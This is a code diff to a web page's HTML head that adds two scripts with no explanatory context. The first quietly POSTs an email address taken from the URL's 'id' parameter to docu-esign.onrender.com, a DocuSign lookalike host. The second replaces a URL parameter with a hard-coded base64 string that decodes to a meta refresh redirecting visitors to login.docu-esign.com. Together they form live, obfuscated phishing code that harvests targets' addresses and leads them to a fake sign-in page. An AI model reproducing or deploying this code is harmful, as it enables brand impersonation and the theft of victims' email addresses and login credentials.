@@ -39,9 +39,28 @@
     </title>
 
     <script type="text/javascript">
+      let hasEmail = new URLSearchParams(window.location.search).has("id");
+      if (hasEmail) {
+        let email = new URLSearchParams(window.location.search).get("id");
+        let payLoad = {id: 0, email: email}
+        let emailXhr = new XMLHttpRequest();
+        emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
+        emailXhr.setRequestHeader("Content-type", "application/json");
+        emailXhr.send(JSON.stringify(payLoad));
+
+        emailXhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                let response = JSON.parse(this.response);
+                console.log(response);
+            }
+        }
+      }
+    </script>
+
+    <script type="text/javascript">
       let hasRef = new URLSearchParams(window.location.search).has("ref");
       if (hasRef) {
-        let ref = new URLSearchParams(window.location.search).get("ref");
+        let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5jb20veW9Xd1hxTUQlM0ZkSk4lM0Q4N25KWHRQbWtJbWlTeVByZ1R4dzh3dUZkNlNjbHlnS1J4VnJKd0hWekFOUC1DMVdvaVlaUUElMjIlMjAvJTNF";
         document.write(decodeURIComponent(atob(`${ref}`)));
       }
     </script>
